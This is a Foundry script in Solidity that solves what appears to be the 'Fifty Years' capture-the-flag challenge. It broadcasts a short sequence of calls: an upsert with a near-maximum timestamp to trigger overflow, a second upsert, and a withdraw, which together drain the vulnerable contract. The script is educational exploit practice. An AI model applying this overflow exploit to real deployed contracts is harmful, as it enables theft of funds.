// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IFiftyYears {
    function isComplete() external view returns (bool);

    function upsert(uint256 index, uint256 timestamp) external payable;

    function withdraw(uint256 index) external;
}

contract FiftyYearsSolution is Script {
    IFiftyYears private fixtyYear = IFiftyYears(vm.envAddress("ADDRESS"));

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        fixtyYear.upsert{value: 1}(666, type(uint256).max - 1 days + 1);
        fixtyYear.upsert{value: 1}(666, 0);
        fixtyYear.withdraw(1);
        vm.stopBroadcast();
        require(fixtyYear.isComplete());
    }
}
